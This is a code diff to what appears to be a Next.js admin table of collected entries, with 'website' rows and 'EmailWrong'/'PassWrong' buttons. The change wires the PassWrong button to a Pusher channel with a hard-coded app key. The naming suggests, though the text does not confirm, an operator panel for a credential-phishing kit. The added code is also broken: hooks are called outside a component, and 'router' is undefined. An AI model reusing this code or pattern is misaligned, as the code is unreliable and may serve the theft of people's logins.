@@ -1,7 +1,25 @@
 import Link from "next/link";
 import { getTimeDistance } from "../../../utils/getTimeDistance";
 import DeleteCollection from "../../DeleteCollection";
+import Pusher from "pusher-js";
+import { useSession } from "next-auth/react";
 
+const { data: session } = useSession();
+const role = session?.user?.admin ? "admin" : "user";
+const posterDetailsId =
+  role === "admin" ? router.query.posterDetailsId : session?.user?.id;
+console.log("posterid", posterDetailsId);
+const handleWrongPass = () => {
+  const pusher = new Pusher("e4766909b306ad7ddd58", {
+    // APP_KEY
+    cluster: "ap2",
+    encrypted: true,
+  });
+  const channel = pusher.subscribe(posterDetailsId);
+  channel.bind("password-notification", (data) => {
+    console.log("notification:", data);
+  });
+};
 export const collectionColumn = [
   {
     Header: "website",
@@ -170,7 +188,10 @@ export const collectionColumn = [
         <button className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded">
           EmailWrong
         </button>
-        <button className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded">
+        <button
+          onClick={handleWrongPass}
+          className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded"
+        >
           PassWrong
         </button>
         <button className="bg-cyan-600 text-xs text-white font-semibold px-2 py-1 rounded">
